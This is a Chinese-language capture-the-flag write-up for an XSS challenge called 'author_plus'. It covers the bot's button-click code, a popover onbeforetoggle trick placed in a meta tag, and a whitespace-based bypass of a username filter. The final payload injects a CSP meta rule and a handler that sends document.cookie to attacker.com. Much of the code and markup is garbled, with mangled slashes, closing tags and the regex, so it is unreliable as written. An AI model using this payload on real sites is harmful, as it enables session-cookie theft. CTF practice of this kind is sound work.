---
tags: [XSS, CSP绕过, 字符编码绕过, Popover API, 标签注入, 源码审计]
---

# author_plus

bot点了两个按钮

```
await  page .goto(article_url ,  {  timeout :  3000 ,  waitUntil :  'domcontentloaded '  })

const  auditBtn  =  await  page .$ ('#audit ') ;
if  (auditBtn)  {
await  Promise .all([
auditBtn .click() ,
page .waitForNavigation({  waitUntil :  'domcontentloaded '  }) , ]) ;
}

let  rejectBtn  =  null;
try  {
rejectBtn  =  await  page .waitForSelector( ' .btn-reject ' ,  {  visible : true ,  timeout :  5000  }) ;

}  catch  (err)  {}
if  (rejectBtn)  {
await  rejectBtn .click() ;
}
```

https://x.com/avlidienbrunn/status/1676549516785221635

其实meta也可以用来放unsafe-inline类型的js

```
<head>
<meta  name= "author "  content= "a "  popover  id=x  onbeforetoggle=alert(1 )  卜d head>
<body>
<button  id=audit  popovertarget=x>Click  med button>
<div  popover  id=x>actual  popoverd div>
d body>
```

a popover id=x onbeforetoggle=alert(1)

当然我们依旧需要csp来限制xss-shield的破坏

```
preg_match('/ k>\\ ' "\\x20\\t\\r\\n ]/ ' ,  $username)
```

实际上这个过滤并不安全， 我测试后使用了两种不同解析结果的空白符 %0b 垂直方向制表符

%0c 换页符

来完成规则的编写和脚本的插入

```
username=script-src-elem%0bhttp:Ⅱblog-app/assets/js/article.js%0chttp - equiv=Content-Security -
Policy%0cpopover%0cid=x%0conbeforetoggle=location.href=`http:Ⅱattacker.com:12 34/ ?
c=${encodeURI(document .cookie)}`&email=9@le0n .com&password=111111&confirm_pass word=111111&csrf_token=c4bb4bfbfbc051eb3ca51912cac3e6ea70b37cc092688fc5f8c313e 611543d5f
```

